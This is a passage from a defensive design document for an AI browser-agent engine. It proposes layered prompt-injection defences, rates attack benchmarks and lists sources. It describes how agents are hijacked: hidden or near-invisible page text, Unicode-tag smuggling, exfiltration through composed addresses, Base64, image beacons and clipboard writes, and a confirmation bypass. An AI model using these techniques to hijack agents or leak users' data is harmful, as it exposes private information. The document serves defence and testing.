4. **Check what leaves for another site.** *New.* (a) An address the agent composed, as opposed to one the person gave or one that is a link on a page already read, with a long query or path, going to a site outside the set: ask, and show the address [8][7]. (b) Text the engine returned from site A that appears, in whole or in part, in an address or in typed text bound for site B: ask, and show the text [7]. Also test the common encodings, since Base64 was used to dodge this kind of check [64]. (c) Count typing into a page as sending. No submit is needed to leak [69]. (d) Scripts in the page and the code tool must not make requests to other sites without the same check. (e) Offer the sub-resource check for strict deployments, for image beacons [13]. This is a coarse version of information-flow control [29][40], limited to what passes through the engine.

5. **Keep and widen the confirmation for consequential actions.** *There; extend.* Add: typing into a password, card or one-time-code field; any file address; downloads; cross-site form submits. Show the exact data that will leave, as OpenAI and the MCP specification advise [7][23]. Keep asking outside the page. Watch the number of questions: Rehberger's bypass worked because the dangerous step was one nobody asked about [69], and asking about everything trains people to say yes.

6. **Stop passing on what a person cannot see.** *There; extend.* Add to the hidden test: zero opacity, near-zero font size, far off-screen position, clipped zero-size boxes, and text with almost no contrast against its background (Brave's faint text was light blue on yellow [21]). All are on Unit 42's list of techniques in use [66]. Strip the Unicode tag block and zero-width characters from every result [70]. Do not show the model the fragment of an address, and cap the query [63][48]. Label names that come only from an attribute, so the model and any scanner know nobody can see them [55][66]. Cap the title and treat it as page text [1]. Apply the same caps and marks to dialog text, console lines, file names and script results (I-14). Measure the cost against section 11 before choosing which checks run on every element.

7. **Mark page text as data, in every result.** *Sentence in the description is there; the marks are new.* A boundary with a random token per result around everything the page wrote, the engine's own words outside it, and a one-line reminder after it [31][12]. Google found a warning next to the content the most useful of the prompt-level defences [44]. It costs a few tokens and works with any model. Adaptive attacks beat it [30], so it is a seat belt.

8. **Scan incoming text, optionally, in two steps.** *New; a setting.* Step one: a small local classifier on each chunk of page text (Prompt Guard 2 22M or 86M, or PIGuard) [16][27]. Step two, only for what step one flags or when the session is signed in: a language-model check with a written policy [18][25][38][39]. On a flag: replace the text with a placeholder, tell the person what was blocked, and switch the session to asking before every action [46][18][5]. Expect it to miss quiet wording and other languages [46] and to be beaten by a determined attacker [30]. Measure false alarms on our own snapshot format first; no source has (section 4).

9. **Check each action against the task, optionally.** *New; a setting; needs the task from layer 3.* A model that sees only the stated task, the tool, the target site and the control's name, and never page text, as Chrome and Brave do [11][22]. A veto goes to the person, not silently back to the agent. Note that a control's name is page text, so it must be capped and marked even here. **Inference** for the last sentence.

10. **Treat screenshots as untrusted input too.** *Partly there.* The instruction "take a screenshot only when text is not enough" already limits exposure. A picture cannot be filtered, so say in the result that text in the picture is page content [5][21]. The contrast check in layer 6 lets the engine warn when a page holds text that is in the picture but nearly invisible. Reading the picture with a second model is the expensive option.

11. **Keep the tool surface clean.** *Mostly there.* Descriptions fixed for the life of a session and free of page text; a version or hash a client can pin [62]. Tell clients, in the connection guide, what the lethal trifecta is and that pairing take-over Chrome with tools that hold private data needs confirmations on [59][15].

12. **One locked-down profile.** *New; settings exist.* Allow list only, read-only tools, no scripts, no uploads or downloads, sub-resource checks on, every action confirmed. OpenAI ships the same idea as Lockdown Mode [9].

13. **Measure, by layer, and keep attacking.** *New.* Report three numbers per layer switched on and off, the way Anthropic does [3]: did the injected text reach the model, did the agent try the attacker's action (WASP's intermediate measure), did the action get through the engine (WASP's end-to-end measure) [48]. Fixed test sets flatter a defence [30][39][44], so add variation: other wordings, other languages, other placements.

What not to build: a design that depends on training the agent model (D1, D2), or on owning the
planner (D12), or a single classifier presented as "the" protection (D5 alone).

## 7. Benchmarks we could use for tests

| Name | What it holds | Licence | Use for us |
|---|---|---|---|
| BrowseSafe-Bench [19][46] | 14,719 HTML pages (11,039 train, 3,680 test), labelled yes or no. 11 attack types, 9 placements (HTML comments, data attributes, CSS-hidden text, hidden fields, attributes, paragraphs, list items, footers, table cells), three wording styles, benign distractors, five kinds of site | **Conflict:** the dataset card says MIT, the paper says CC BY-NC-ND 4.0. Ask before using | The closest fit. Run each page through our own snapshot and count how many hidden injections survive (a fixed test for layer 6). Also the test set for a classifier, including false alarms on the benign half |
| WASP [48] | 84 attack tasks on copies of GitLab and Reddit: 21 attacker goals, two injection templates (plain text, and an address fragment), 37 ordinary tasks to check the agent still works | CC BY-NC 4.0 for code and data; repository archived [76] | The right shape for an end-to-end test through a real browser, and the source of the two measures in layer 13. Heavy: Docker images, 4 to 6 hours a run. Non-commercial licence |
| AgentDojo [47] | 97 tasks and 629 security test cases over simulated tools (mail, banking, travel, workspace); attacks and defences can be plugged in | MIT | Not browser pages. Useful for attack wordings and for its adaptive-attack harness. Its scoring has known flaws [39] |
| InjecAgent | 1,054 cases, 17 user tools, 62 attacker tools; direct harm and data theft | MIT | Simple, old attacks; no measure of whether the task still works [39]. A source of wordings |
| VPI-Bench [51] | 306 visual cases on five platforms (shopping, booking, news, messaging, mail) for computer-use and browser-use agents | Paper CC BY 4.0; the repository has no licence file [76] | The model for a screenshot test set. Ask before reusing files |
| RedTeamCUA [52] | 864 examples mixing web and operating system | Paper CC BY 4.0; repository not checked | Ideas for attacks that cross from the page to files |
| AgentDAM [50] | Web tasks that test whether an agent uses private data only when needed | Paper CC BY 4.0; repository licence is non-standard [76] | A test for the data-flow layer: does private data go where it should not, with no attacker at all |
| Gray Swan IPI competition [53] | 41 behaviours, 272,000 attempts, 8,648 successes. The environment is open; 95 successful attacks are released; more is on Hugging Face | Not checked | Recent human-written attacks that worked on frontier models |
| LLMail-Inject [57] | More than 370,000 attack emails written by people against known defences [13] | MIT | A large body of human attack text for classifier tests. Mail, not web |
| NotInject [27][56] | 339 harmless sentences full of trigger words | MIT | The false-alarm test for any classifier |
| PINT [26] | 4,314 inputs in 24 languages, most of them harmless | Repository MIT, archived; the data is not public | Only its published scores are of use |
| Agent Security Bench | Tool-calling agents | MIT | Flawed scoring per [39]; low priority |
| Unit 42's list [66] | Not a dataset: the hiding techniques and wordings seen on live sites | — | The checklist for our own pages: one test page per technique |

Our own set should come first: one small page per row of section 2.1, crossed with a few goals from
section 2.2, served by the test server the repository already has. The borrowed sets then check that
we did not only defend against our own imagination. Licences marked "ask" or "non-commercial" need
the owner's decision before any file enters the repository.

## 8. Open questions

1. **Where does the task come from?** The engine cannot see the user's request. Do we add an optional task and site list at session start? Who may set it: the client, the person in the viewer, or both? Layers 3, 4 and 9 depend on the answer.
2. **What does the stronger hidden test cost?** Opacity, size, position and contrast need style lookups, which section 11 forbids on the common path. Which of them can run only on text nodes, or only when a cheaper test is unsure?
3. **What to do with attribute names?** An icon button has no visible text, so its `aria-label` is needed. Is a label ("name not visible") enough, or should long attribute names be cut harder?
4. **How do small classifiers behave on our snapshot format?** They were trained on prose and tested on raw HTML. BrowseSafe warns that extracted text may do worse. False alarms on ordinary pages are unmeasured.
5. **How fast is Prompt Guard 2 on a laptop CPU?** Only GPU times are published in what was read.
6. **Are the licences acceptable?** Llama 4 Community License for Prompt Guard 2; the BrowseSafe-Bench conflict; WASP's non-commercial terms.
7. **May page content go to a second model?** On take-over Chrome the pages are the person's private ones. Local-only scanning there?
8. **What happens on a flag with nobody watching?** In headless runs with no viewer the current rule is "not done". Is a whole session stopped, or only the flagged page withheld?
9. **Can the engine stop clipboard writes?** A click by the agent may count as the gesture a page needs to write to the clipboard. Whether a browser permission can deny it in all three backends was not checked. On the person's own machine the clipboard is the real one.
10. **How far can a string match go?** Encoding and rewording defeat it. Is "new site plus composed address plus long query" enough as the fallback rule?
11. **Are `data:` and `blob:` addresses a hole?** Both are in the default scheme list. A page could hand the agent a `data:` address that is itself a page with no site. Not covered by any source read.
12. **Does the reference loop get its own layer?** It is the one loop we own. Plan first, or a critic on its reasoning, would be possible there and nowhere else.
13. **How do we attack ourselves?** Without a trained attacker, what is our stand-in: the Gray Swan environment, AgentDojo's adaptive attacks, or people?
14. **Screenshots.** Is a warning in the result enough, or do we need a second model that reads the picture?

## 9. Sources

Vendor pages (V)

1. Anthropic, "Piloting Claude in Chrome", 2025-08-25, updated to 2025-12-18. https://claude.com/blog/claude-for-chrome
2. Anthropic, "Mitigating the risk of prompt injections in browser use", 2025-11-24. https://www.anthropic.com/research/prompt-injection-defenses
3. Anthropic, "System Card: Claude Opus 5", 2026-07-24, changelog 2026-08-19, section 5.2. Read as text. https://www-cdn.anthropic.com/ceaf5c7ff2783855203fde8208ec311252dced5b/Claude%20Opus%205%20System%20Card.pdf
4. Anthropic help centre, "Using Claude in Chrome safely". https://support.claude.com/en/articles/12902428-using-claude-in-chrome-safely
5. Anthropic documentation, "Computer use tool", security considerations. Read directly. https://platform.claude.com/docs/en/agents-and-tools/tool-use/computer-use-tool
6. OpenAI, "Continuously hardening ChatGPT Atlas against prompt injection". No date on the copy read. Read through a proxy. https://openai.com/index/hardening-atlas-against-prompt-injection
7. OpenAI, "Designing agents to resist prompt injection". A search listing dates it 2026-03-11. Read through a proxy. https://openai.com/index/designing-agents-to-resist-prompt-injection/
8. OpenAI, "Keeping your data safe when an AI agent clicks a link". No date on the copy read. Read through a proxy. https://openai.com/index/ai-agent-link-safety/
9. OpenAI, "Introducing Lockdown Mode and Elevated Risk labels in ChatGPT", 2026-02-13 per a search listing, updated 2026-06-04. Read through a proxy. https://openai.com/index/introducing-lockdown-mode-and-elevated-risk-labels-in-chatgpt/
10. OpenAI, Moderation guide. https://developers.openai.com/api/docs/guides/moderation
11. Google Chrome Security, "Architecting security for agentic capabilities in Chrome", 2025-12-08. https://blog.google/security/architecting-security-for-agentic/
12. Google, "Mitigating prompt injection attacks with a layered defense strategy", 2025-06-13. https://blog.google/security/mitigating-prompt-injection-attacks/
13. Microsoft Security Response Center, "How Microsoft defends against indirect prompt injection attacks", 2025-07-29. https://www.microsoft.com/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks
14. Microsoft Learn, "Prompt Shields in Azure AI Content Safety", page dated 2026-08-28, and the service overview for rate limits. https://learn.microsoft.com/en-us/azure/ai-services/content-safety/concepts/jailbreak-detection
15. Meta, "Agents Rule of Two: A Practical Approach to AI Agent Security", 2025-10-31. https://ai.meta.com/blog/practical-ai-agent-security/
16. Meta, Llama Prompt Guard 2 86M model card (covers the 22M model too). https://huggingface.co/meta-llama/Llama-Prompt-Guard-2-86M
17. Meta, Llama Guard 4 12B model card. https://huggingface.co/meta-llama/Llama-Guard-4-12B
18. Perplexity, "Mitigating prompt injection in Comet", 2025-10-22. Read through a proxy. https://www.perplexity.ai/hub/blog/mitigating-prompt-injection-in-comet
19. Perplexity, "Building safer AI browsers with BrowseSafe", 2025-12-02 (through a proxy), with the model card and the dataset card. https://www.perplexity.ai/hub/blog/browsesafe , https://huggingface.co/perplexity-ai/browsesafe , https://huggingface.co/datasets/perplexity-ai/browsesafe-bench
22. Brave, on AI browsing in Brave, 2025-12-10, updated 2026-05-05. https://brave.com/blog/ai-browsing/
23. Model Context Protocol specification 2025-06-18, "Tools". https://modelcontextprotocol.io/specification/2025-06-18/server/tools
24. ProtectAI, deberta-v3-base-prompt-injection-v2 model card. https://huggingface.co/protectai/deberta-v3-base-prompt-injection-v2
25. OpenAI, gpt-oss-safeguard-20b model card. https://huggingface.co/openai/gpt-oss-safeguard-20b
26. Lakera, PINT benchmark (scores as of 2025-05-02) and Lakera Guard documentation. https://github.com/lakeraai/pint-benchmark , https://docs.lakera.ai/docs/defenses
27. PIGuard model card and repository (with NotInject). Read directly. https://huggingface.co/leolee99/PIGuard , https://github.com/leolee99/PIGuard

Papers (P)

28. Beurer-Kellner et al., "Design Patterns for Securing LLM Agents against Prompt Injections", June 2025. https://arxiv.org/abs/2506.08837
29. Debenedetti et al., "Defeating Prompt Injections by Design" (CaMeL), March 2025. https://arxiv.org/abs/2503.18813
30. Nasr, Carlini et al., "The Attacker Moves Second: Stronger Adaptive Attacks Bypass Defenses Against LLM Jailbreaks and Prompt Injections", October 2025. https://arxiv.org/abs/2510.09023
31. Hines et al., "Defending Against Indirect Prompt Injection Attacks With Spotlighting", March 2024. https://arxiv.org/abs/2403.14720
32. Wallace et al., "The Instruction Hierarchy: Training LLMs to Prioritize Privileged Instructions", April 2024. https://arxiv.org/abs/2404.13208
33. Chen et al., "StruQ: Defending Against Prompt Injection with Structured Queries", USENIX Security 2025. https://arxiv.org/abs/2402.06363
34. Chen et al., "SecAlign", ACM CCS 2025, and "Meta-SecAlign". https://arxiv.org/abs/2410.05451 , https://arxiv.org/abs/2507.02735
35. Zhu et al., "MELON", ICML 2025. https://arxiv.org/abs/2502.05174
36. Jia et al., "The Task Shield", December 2024. https://arxiv.org/abs/2412.16682
37. Liu et al., "DataSentinel", IEEE S&P 2025. https://arxiv.org/abs/2504.11358
38. Shi et al., "PromptArmor: Simple yet Effective Prompt Injection Defenses", July 2025. https://arxiv.org/abs/2507.15219
39. Bhagwatkar et al., "Indirect Prompt Injections: Are Firewalls All You Need, or Stronger Benchmarks?", October 2025, revised March 2026. https://arxiv.org/abs/2510.05244
40. Costa et al., "Securing AI Agents with Information-Flow Control" (FIDES), May 2025. Abstract only. https://arxiv.org/abs/2505.23643
41. Abdelnabi et al., "Get my drift? Catching LLM Task Drift with Activation Deltas" (TaskTracker), June 2024. https://arxiv.org/abs/2406.00799
42. Shi et al., "Progent: Securing AI Agents with Privilege Control", April 2025. Abstract only. https://arxiv.org/abs/2504.11703
43. Chennabasappa et al., "LlamaFirewall", May 2025. https://arxiv.org/abs/2505.03574
44. Shi et al., "Lessons from Defending Gemini Against Indirect Prompt Injections", May 2025. https://arxiv.org/abs/2505.14534
45. Foerster et al., "CaMeLs Can Use Computers Too", January 2026. Abstract only. https://arxiv.org/abs/2601.09923
46. Zhang et al., "BrowseSafe: Understanding and Preventing Prompt Injection Within AI Browser Agents", November 2025. https://arxiv.org/abs/2511.20597
47. Debenedetti et al., "AgentDojo", June 2024. https://arxiv.org/abs/2406.13352 , https://github.com/ethz-spylab/agentdojo
48. Evtimov et al., "WASP: Benchmarking Web Agent Security Against Prompt Injection Attacks", April 2025. https://arxiv.org/abs/2504.18575 , https://github.com/facebookresearch/wasp
49. Zhan et al., InjecAgent (repository read, not the paper). https://github.com/uiuc-kang-lab/InjecAgent
50. Zharmagambetov et al., "AgentDAM", March 2025. Abstract only. https://arxiv.org/abs/2503.09780
51. Cao et al., "VPI-Bench", June 2025. https://arxiv.org/abs/2506.02456 , https://github.com/cua-framework/agents
52. Liao et al., "RedTeamCUA", May 2025. Abstract only. https://arxiv.org/abs/2505.21936
53. Dziemian et al., "How Vulnerable Are AI Agents to Indirect Prompt Injections? Insights from a Large-Scale Public Competition", March 2026. Abstract only. https://arxiv.org/abs/2603.15714
54. Zhang, Yu, Yang, "Attacking Vision-Language Computer Agents via Pop-ups", ACL 2025. Abstract only. https://arxiv.org/abs/2411.02391
55. Liao et al., "EIA: Environmental Injection Attack on Generalist Web Agents for Privacy Leakage", September 2024. Abstract only. https://arxiv.org/abs/2409.11295
56. Li and Liu, "InjecGuard: Benchmarking and Mitigating Over-defense in Prompt Injection Guardrail Models", October 2024. Abstract only. https://arxiv.org/abs/2410.22770
57. Microsoft, LLMail-Inject dataset card. Read directly. https://huggingface.co/datasets/microsoft/llmail-inject-challenge
58. "EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System". Search summary only. https://arxiv.org/abs/2509.10540

Third parties (T)

20. Brave, "Agentic Browser Security: Indirect Prompt Injection in Perplexity Comet", 2025-08-20. A competing vendor's security team. https://brave.com/blog/comet-prompt-injection/
21. Brave, "Unseeable prompt injections in screenshots: more vulnerabilities in Comet and other AI browsers", 2025-10-21. https://brave.com/blog/unseeable-prompt-injections/
59. Simon Willison, "The lethal trifecta for AI agents", 2025-06-16. https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
60. Simon Willison, "The Dual LLM pattern for building AI assistants that can resist prompt injection", 2023-04-25. https://simonwillison.net/2023/Apr/25/dual-llm-pattern/
61. Simon Willison, notes on the design-patterns paper, 2025-06-13. https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/
62. Invariant Labs, "MCP Security Notification: Tool Poisoning Attacks", 2025-04-01. https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks
63. Help Net Security on Cato Networks' HashJack, 2025-11-26. Cato's own post could not be read. https://www.helpnetsecurity.com/2025/11/26/hashjack/
64. LayerX, "CometJacking", 2025-10-04. https://layerxsecurity.com/blog/cometjacking-how-one-click-can-turn-perplexitys-comet-ai-browser-against-you/
65. Guardio Labs, "Scamlexity", 2025-08-20. https://guard.io/labs/scamlexity-we-put-agentic-ai-browsers-to-the-test-they-clicked-they-paid-they-failed
66. Palo Alto Networks Unit 42, "Fooling AI Agents: Web-Based Indirect Prompt Injection Observed in the Wild", 2026-03-03. https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/
67. Zenity Labs, "PleaseFix" disclosure, 2026-03-03. The Black Hat 2026 follow-up was seen only as a search summary. https://zenity.io/company-overview/newsroom/company-news/zenity-labs-discloses-pleasefix-perplexedagent-vulnerability
68. Trail of Bits, "Using threat modeling and prompt injection to audit Comet", 2026-02-20. https://blog.trailofbits.com/2026/02/20/using-threat-modeling-and-prompt-injection-to-audit-comet/
69. Johann Rehberger, "ChatGPT Operator: Prompt Injection Exploits & Defenses", 2025-02-17. https://embracethered.com/blog/posts/2025/chatgpt-operator-prompt-injection-exploits/
70. Johann Rehberger, "ASCII Smuggler" on Unicode tags, 2024-01-14. https://embracethered.com/blog/posts/2024/hiding-and-finding-text-with-unicode-tags/
71. Android Authority, on clipboard injection in ChatGPT Atlas, 2025-10-22. https://www.androidauthority.com/openai-atlas-clipboard-injection-vulnerability-3609982/
72. NeuralTrust, "OpenAI Atlas Omnibox Prompt Injection", 2025-10-24. Read, not used above: an address-bar attack that needs a person to paste. https://neuraltrust.ai/blog/openai-atlas-omnibox-prompt-injection
73. UK National Cyber Security Centre, "Prompt injection is not SQL injection (it may be worse)", 2025-12-08. https://www.ncsc.gov.uk/blog-post/prompt-injection-is-not-sql-injection
74. VentureBeat, on the Claude Opus 4.8 system card, 2026-05-28. https://venturebeat.com/security/anthropic-browser-agent-hijacked-31-percent-before-safeguards-engaged
75. "Invitation Is All You Need" (Nassi, Cohen, Yair). Search summary of press reports only.
76. GitHub repository data read on 2026-10-06 (licence and archived fields) for agentdojo, wasp, InjecAgent, cua-framework/agents, ai-agent-privacy, pint-benchmark, llm-guard, PIGuard, ASB, llmail-inject-challenge.
